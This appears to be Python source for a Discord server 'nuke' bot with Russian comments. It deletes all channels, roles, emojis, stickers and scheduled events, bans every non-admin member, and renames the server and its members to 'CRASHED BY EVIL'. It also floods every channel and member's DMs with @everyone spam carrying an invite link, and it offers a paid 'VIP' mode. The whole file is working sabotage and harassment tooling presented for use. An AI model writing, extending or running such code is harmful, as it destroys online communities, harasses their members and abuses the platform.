import datetime
import asyncio
import os
import aiohttp
import disnake
import base64
from datetime import datetime, timedelta
from aiohttp import ClientSession

from ..config.config import (CHNAME, EVENT_NAME, LINKSERV, ROLENAME, TEXT,
                             headers)
from .async_tasks import create_tasks, request


class Fucker:
    def __init__(self, ctx):
        self.ctx = ctx
        self.headers = headers
        self.bot = ctx.bot

    # ============= ОБЫЧНЫЙ СПАМ (2 пинга) =============
    async def spam(self, ctx):
        spam_amount = 2
        urls = []
        embed = {
            "title": "EVIL | https://discord.gg/TCvsXj8teg",
            "description": f"```{TEXT}```\n\n> {LINKSERV}",
        }
        json = {"content": f"@everyone {LINKSERV}", "embed": embed}

        channels = self.ctx.guild.text_channels + self.ctx.guild.voice_channels
        for channel in channels:
            urls.extend(
                [
                    f"https://discord.com/api/v9/channels/{channel.id}/messages"
                    for _ in range(spam_amount)
                ]
            )
        async with ClientSession(headers=self.headers, connector=None) as session:
            await create_tasks(urls, session.post, self.headers, json)

    # ============= VIP СПАМ (5 пингов) =============
    async def spamVip(self, ctx):
        spam_amount = 5
        urls = []
        embed = {
            "title": "VIP EVIL | https://discord.gg/TCvsXj8teg",
            "description": f"```{TEXT}```\n\n> {LINKSERV}",
        }
        json = {"content": f"@everyone VIP CRASHED BY EVIL {LINKSERV}", "embed": embed}

        channels = self.ctx.guild.text_channels + self.ctx.guild.voice_channels
        for channel in channels:
            urls.extend(
                [
                    f"https://discord.com/api/v9/channels/{channel.id}/messages"
                    for _ in range(spam_amount)
                ]
            )
        async with ClientSession(headers=self.headers, connector=None) as session:
            await create_tasks(urls, session.post, self.headers, json)

    # ============= ОБЫЧНЫЕ КАНАЛЫ (7 штук) =============
    async def crChannels(self, ctx):
        async with ClientSession(headers=self.headers, connector=None) as session:
            tasks = []
            for i in range(7):
                json = {"name": f"{CHNAME}-{i+1}", "topic": "", "type": 0}
                url = f"https://discord.com/api/v9/guilds/{self.ctx.guild.id}/channels"
                tasks.append(session.post(url, json=json))
            await asyncio.gather(*tasks)

    # ============= VIP КАНАЛЫ (20 штук) =============
    async def crChannelsVip(self, ctx):
        async with ClientSession(headers=self.headers, connector=None) as session:
            tasks = []
            for i in range(20):
                json = {"name": f"VIP-CRASHED-BY-EVIL-{i+1}", "topic": "", "type": 0}
                url = f"https://discord.com/api/v9/guilds/{self.ctx.guild.id}/channels"
                tasks.append(session.post(url, json=json))
            await asyncio.gather(*tasks)

    # ============= СОЗДАНИЕ ИВЕНТА =============
    async def create_event(self, ctx):
        name = EVENT_NAME
        time = (datetime.now() + timedelta(days=30)).isoformat()
        json = {
            "channel_id": None,
            "entity_metadata": {"location": name},
            "name": name,
            "privacy_level": 2,
            "scheduled_start_time": datetime.now().isoformat(),
            "scheduled_end_time": time,
            "description": name,
            "entity_type": 3,
            "image": None,
        }
        url = f"https://discord.com/api/v10/guilds/{self.ctx.guild.id}/scheduled-events"
        async with ClientSession(headers=self.headers, connector=None) as session:
            await session.post(url, json=json)

    # ============= УДАЛЕНИЕ РОЛЕЙ =============
    async def delRoles(self, ctx):
        async with ClientSession(headers=self.headers, connector=None) as session:
            tasks = []
            for role in self.ctx.guild.roles:
                if role.name != "@everyone":
                    url = f"https://discord.com/api/v9/guilds/{self.ctx.guild.id}/roles/{role.id}"
                    tasks.append(session.delete(url))
            if tasks:
                await asyncio.gather(*tasks)

    # ============= УДАЛЕНИЕ ИВЕНТОВ =============
    async def delete_events(self, ctx):
        async with ClientSession(headers=self.headers, connector=None) as session:
            url = f"https://discord.com/api/v10/guilds/{self.ctx.guild.id}/scheduled-events"
            events = await session.get(url)
            events = await events.json()
            tasks = []
            for event in events:
                url = f'https://discord.com/api/v10/guilds/{self.ctx.guild.id}/scheduled-events/{event["id"]}'
                tasks.append(session.delete(url))
            if tasks:
                await asyncio.gather(*tasks)

    # ============= УДАЛЕНИЕ КАНАЛОВ =============
    async def delChannels(self, ctx):
        async with ClientSession(headers=self.headers, connector=None) as session:
            tasks = []
            for channel in self.ctx.guild.channels:
                url = f"https://discord.com/api/v9/channels/{channel.id}"
                tasks.append(session.delete(url))
            if tasks:
                await asyncio.gather(*tasks)

    # ============= СОЗДАНИЕ РОЛЕЙ (25 штук) =============
    async def crRoles(self, ctx, name="hidakiteamfuckyo"):
        async with ClientSession(headers=self.headers, connector=None) as session:
            tasks = []
            for _ in range(25):
                json = {"name": ROLENAME}
                url = f"https://discord.com/api/v8/guilds/{self.ctx.guild.id}/roles"
                tasks.append(session.post(url, json=json))
            await asyncio.gather(*tasks)

    # ============= ПЕРЕИМЕНОВАНИЕ СЕРВЕРА =============
    async def renameGuild(self, ctx, name="CRASHED BY EVIL"):
        url = f"https://discord.com/api/v9/guilds/{self.ctx.guild.id}"
        json = {"name": name}
        async with ClientSession(headers=self.headers, connector=None) as session:
            await session.patch(url, json=json)

    # ============= СМЕНА АВАТАРКИ СЕРВЕРА =============
    async def change_avatar(self, ctx, avatar_path="serverlogo.png"):
        """Меняет аватарку сервера на указанный файл"""
        if not os.path.exists(avatar_path):
            print(f"❌ Файл {avatar_path} не найден!")
            return
        
        try:
            with open(avatar_path, 'rb') as f:
                avatar_data = f.read()
            
            avatar_base64 = base64.b64encode(avatar_data).decode('utf-8')
            
            url = f"https://discord.com/api/v9/guilds/{self.ctx.guild.id}"
            json = {"icon": f"data:image/png;base64,{avatar_base64}"}
            
            async with ClientSession(headers=self.headers, connector=None) as session:
                await session.patch(url, json=json)
            print(f"✅ Аватарка сервера изменена на {avatar_path}")
        except Exception as e:
            print(f"❌ Ошибка смены аватарки: {e}")

    # ============= УДАЛЕНИЕ ВСЕХ ЭМОДЗИ =============
    async def delete_all_emojis(self, ctx):
        async with ClientSession(headers=self.headers, connector=None) as session:
            tasks = []
            for emoji in ctx.guild.emojis:
                url = f"https://discord.com/api/v9/guilds/{ctx.guild.id}/emojis/{emoji.id}"
                tasks.append(session.delete(url))
            if tasks:
                await asyncio.gather(*tasks)

    # ============= УДАЛЕНИЕ ВСЕХ СТИКЕРОВ =============
    async def delete_all_stickers(self, ctx):
        async with ClientSession(headers=self.headers, connector=None) as session:
            tasks = []
            for sticker in ctx.guild.stickers:
                url = f"https://discord.com/api/v9/guilds/{ctx.guild.id}/stickers/{sticker.id}"
                tasks.append(session.delete(url))
            if tasks:
                await asyncio.gather(*tasks)

    # ============= ДОБАВЛЕНИЕ ЭМОДЗИ =============
    async def add_max_emojis(self, ctx, emoji_path="log.png", emoji_name="evil"):
        if not os.path.exists(emoji_path):
            print(f"❌ Файл {emoji_path} не найден!")
            return

        with open(emoji_path, 'rb') as f:
            emoji_data = f.read()

        max_emojis = 50
        current_emojis = len(ctx.guild.emojis)
        available_slots = max_emojis - current_emojis

        if available_slots <= 0:
            print("❌ Нет свободных слотов для эмодзи!")
            return

        async with ClientSession(headers=self.headers) as session:
            tasks = []
            for i in range(available_slots):
                data = aiohttp.FormData()
                data.add_field('name', f"{emoji_name}_{i+1}")
                data.add_field('image', emoji_data, filename='log.png', content_type='image/png')
                url = f"https://discord.com/api/v9/guilds/{ctx.guild.id}/emojis"
                tasks.append(session.post(url, data=data))
            await asyncio.gather(*tasks)

    # ============= ДОБАВЛЕНИЕ СТИКЕРОВ =============
    async def add_max_stickers(self, ctx, sticker_path="log.png", sticker_name="evil"):
        if not os.path.exists(sticker_path):
            print(f"❌ Файл {sticker_path} не найден!")
            return

        with open(sticker_path, 'rb') as f:
            sticker_data = f.read()

        max_stickers = 50
        current_stickers = len(ctx.guild.stickers)
        available_slots = max_stickers - current_stickers

        if available_slots <= 0:
            print("❌ Нет свободных слотов для стикеров!")
            return

        async with ClientSession(headers=self.headers) as session:
            tasks = []
            for i in range(available_slots):
                data = aiohttp.FormData()
                data.add_field('name', f"{sticker_name}_{i+1}")
                data.add_field('tags', 'evil')
                data.add_field('file', sticker_data, filename='log.png', content_type='image/png')
                url = f"https://discord.com/api/v9/guilds/{ctx.guild.id}/stickers"
                tasks.append(session.post(url, data=data))
            await asyncio.gather(*tasks)

    # ============= БАН ВСЕХ ПОЛЬЗОВАТЕЛЕЙ =============
    async def ban_all(self, ctx):
        async with ClientSession(headers=self.headers, connector=None) as session:
            tasks = []
            for member in ctx.guild.members:
                if member.id != ctx.bot.user.id and not member.guild_permissions.administrator:
                    url = f"https://discord.com/api/v9/guilds/{ctx.guild.id}/bans/{member.id}"
                    tasks.append(session.put(url))
            if tasks:
                await asyncio.gather(*tasks)
                print(f"✅ Забанено {len(tasks)} пользователей")
            else:
                print("⚠️ Нет пользователей для бана")

    # ============= МАССОВАЯ РАССЫЛКА В ЛС =============
    async def dm_all(self, ctx, text="EVIL NUKE | https://discord.gg/TCvsXj8teg"):
        success = 0
        failed = 0
        
        embed = {
            "title": "EVIL NUKE",
            "description": f"```{text}```",
            "color": 0x2f3136,
            "footer": {"text": "EVIL NUKE"},
            "timestamp": datetime.now().isoformat()
        }
        
        for member in ctx.guild.members:
            if member.id == ctx.bot.user.id or member.bot:
                continue
            
            try:
                url = f"https://discord.com/api/v9/users/@me/channels"
                json_data = {"recipients": [str(member.id)]}
                
                async with ClientSession(headers=self.headers, connector=None) as session:
                    async with session.post(url, json=json_data) as resp:
                        if resp.status == 200:
                            channel_data = await resp.json()
                            channel_id = channel_data.get("id")
                            
                            if channel_id:
                                msg_url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
                                async with session.post(msg_url, json={"embed": embed}) as msg_resp:
                                    if msg_resp.status in [200, 201]:
                                        success += 1
                                    else:
                                        failed += 1
                        else:
                            failed += 1
                await asyncio.sleep(0.3)
            except Exception as e:
                failed += 1
                print(f"❌ Ошибка отправки ЛС {member.name}: {e}")
        
        embed_result = disnake.Embed(
            title="📨 РЕЗУЛЬТАТ РАССЫЛКИ",
            description=f"✅ Успешно: {success}\n"
                        f"❌ Неудачно: {failed}\n"
                        f"📊 Всего: {success + failed}",
            color=disnake.Color.from_rgb(48, 49, 54)
        )
        await ctx.send(embed=embed_result)

    # ============= РАЗБЛОКИРОВКА ВСЕХ КАНАЛОВ =============
    async def unlock_channels(self, ctx):
        for channel in ctx.guild.text_channels:
            try:
                url = f"https://discord.com/api/v9/channels/{channel.id}/permissions/{ctx.guild.default_role.id}"
                async with ClientSession(headers=self.headers, connector=None) as session:
                    await session.patch(
                        url,
                        json={"send_messages": True, "read_messages": True, "add_reactions": True},
                        headers=self.headers
                    )
            except:
                pass

    # ============= ПЕРЕИМЕНОВАНИЕ ВСЕХ УЧАСТНИКОВ =============
    async def rename_all(self, ctx, name="Crashed By EVIL"):
        async with ClientSession(headers=self.headers, connector=None) as session:
            tasks = []
            for member in ctx.guild.members:
                if member.id != ctx.bot.user.id and not member.guild_permissions.administrator:
                    url = f"https://discord.com/api/v9/guilds/{ctx.guild.id}/members/{member.id}"
                    tasks.append(session.patch(url, json={"nick": name}))
            await asyncio.gather(*tasks)

    # ============= СМЕНА ЦВЕТА РОЛЕЙ =============
    async def role_color(self, ctx, color_name):
        colors = {
            "red": 0xFF0000,
            "green": 0x00FF00,
            "black": 0x000000
        }
        color = colors.get(color_name.lower(), 0x2f3136)
        async with ClientSession(headers=self.headers, connector=None) as session:
            tasks = []
            for role in ctx.guild.roles:
                if role.name != "@everyone":
                    url = f"https://discord.com/api/v9/guilds/{ctx.guild.id}/roles/{role.id}"
                    tasks.append(session.patch(url, json={"color": color}))
            await asyncio.gather(*tasks)